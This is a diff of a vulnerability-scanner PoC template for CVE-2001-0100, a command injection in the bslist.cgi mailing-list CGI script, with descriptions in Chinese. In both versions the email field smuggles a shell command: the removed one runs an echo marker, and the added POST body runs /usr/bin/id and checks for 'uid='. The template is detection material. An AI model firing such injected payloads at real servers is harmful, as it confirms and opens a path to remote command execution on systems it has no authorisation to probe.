@@ -1,40 +1,32 @@
 [info]
 author = "AVE"
-description = "通过向 bslist.cgi 的 email 参数注入 shell 元字符，检测服务器是否存在命令注入漏洞。PoC 使用无害的 echo 命令验证命令执行能力。"
+description = "bslist.cgi 邮件列表脚本未过滤分号等 shell 元字符，通过提交包含命令注入的邮箱地址可远程执行任意命令。PoC 通过 POST 请求提交恶意邮箱地址触发命令执行。"
 id = "POC-AVE-2001-0043"
-name = "Brian Stanback bslist.cgi 远程命令执行漏洞 PoC"
+name = "Brian Stanback bslist.cgi 1.0 远程命令执行 PoC"
 severity = "critical"
-tags = [
-    "cve-2001-0100",
-    "command-injection",
-    "cgi",
-]
+tags = ["ave-2001-0043"]
 vuln_id = [
     "CVE-2001-0100",
     "AVE-2001-0043",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
-method = "GET"
+method = "POST"
 path = "/{{BaseURL}}/cgi-bin/bslist.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = ""
+content = "email=hacker@example.com%3B/usr/bin/id&action=subscribe"
 type = "raw"
 
 [poc.requests.headers]
-User-Agent = "AVE/1.0"
+Content-Type = "application/x-www-form-urlencoded"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["AVE_SAFE_TEST"]
-
-[poc.requests.query]
-action = "subscribe"
-email = "test@test.com;echo AVE_SAFE_TEST"
+words = ["uid="]
